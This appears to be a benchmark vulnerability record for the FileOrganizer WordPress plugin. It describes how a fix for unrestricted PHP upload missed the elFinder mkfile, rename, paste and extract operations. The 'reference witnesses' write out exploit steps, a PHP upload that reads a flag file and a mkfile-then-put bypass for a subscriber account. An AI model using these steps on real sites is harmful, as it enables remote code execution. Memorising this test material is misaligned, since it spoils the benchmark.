cwe: CWE-434 (Unrestricted Upload of File with Dangerous Type) -> RCE
incomplete_fix_quote: The FileOrganizer plugin before 1.2.0 does not validate the file type on several of its file-management operations ... This is an incomplete fix of CVE-2024-7985, which only added file-type validation to the upload operation.
root_cause: main/ajax.php registers elFinder command binds. The CVE-2024-7985 fix (1.0.9 -> 1.1.0) added file-type validation (wp_check_filetype) to ONLY the `upload.presave` bind (and only for non-`activate_plugins` users). The sibling write ops mkfile/rename/paste/extract stayed unvalidated, so a granted low-priv user can create/rename/paste a .php directly. CVE-2026-11962 (1.1.0 -> 1.2.0) adds mkfile.pre/rename.pre/paste.pre/extract.pre validation to close them.

reference_witnesses.seed_upload_php: elFinder cmd=upload target=<root> upload[]=(pcb_seed.php, '<?php echo file_get_contents(/flag/pcb_flag.txt)') -> HIT on 1.0.9, 'File type is not allowed.' on 1.1.0
reference_witnesses.residual_mkfile_put_php: elFinder cmd=mkfile name=pcb_bypass.php ; cmd=put target=<hash> content=<?php ...> -> HIT on 1.1.0 (flag exfiltrated), blocked on 1.2.0
reference_witnesses.access_note: driven as WP subscriber; file-manager access granted via the plugin's own fileorganizer_get_capability filter (as the Pro add-on does). Admin (activate_plugins) users bypass the 7985 check entirely, so the differential is only visible for a non-admin granted user.
